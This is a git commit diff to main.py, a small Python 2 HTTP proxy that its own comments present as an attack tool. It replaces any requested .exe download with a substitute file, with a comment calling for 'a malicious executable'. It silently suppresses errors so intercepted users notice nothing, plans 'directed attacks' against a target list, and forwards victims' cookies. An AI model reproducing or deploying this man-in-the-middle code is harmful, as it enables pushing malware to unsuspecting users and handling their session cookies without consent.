10ad2ec2f49e9c0074696d33a3a6b3d79a5b1323
root <root@localhost.localdomain>
2014-05-16 12:27:39 -0500

    latest update

--- main.py
+++ main.py
@@ -4,21 +4,36 @@ import urllib, urllib2
 import re
 import os
 
+# 1234 used for setting up local proxy
+# change to 80 for full version
 PORT = 1234
 
 class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
     error_message_format = ""
+    # we do not send urllib errors to client to maintain transparency
     def send_error(self, code, message):
-        return
+        return False
     def do_GET(self):
+	# possible TODO: read through list of targets so that we can have directed attacks
         if self.path[len(self.path)-3:] == "exe":
+		# replace file name with a malicious executable
                 self.path="/test.txt"
         else:
-                urlhandle = urllib.urlopen(self.path)
+		opener = urllib2.build_opener()
+		urlhdr = []
+		urlhdr = [("user-agent", self.headers.get("user-agent")), ("cookie", self.headers.get("cookie"))]
+		# weird things happen with encoding, uncomment at your own risk
+		#for item in self.headers:
+		#	urlhdr.append((item, self.headers.get(item)))
+		opener.addheaders = urlhdr
+                urlhandle = opener.open(self.path)
                 self.wfile.write(urlhandle.read())
         return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
     def do_POST(self):
-        urlhandle = urllib.urlopen(self.path)
+	opener = urllib2.build_opener()
+	urlhdr = [("user-agent", self.headers.get("user-agent")), ("cookie", self.headers.get("cookie"))]
+	opener.addheaders = urlhdr
+        urlhandle = opener.open(self.path)
         self.wfile.write(urlhandle.read())
 
 
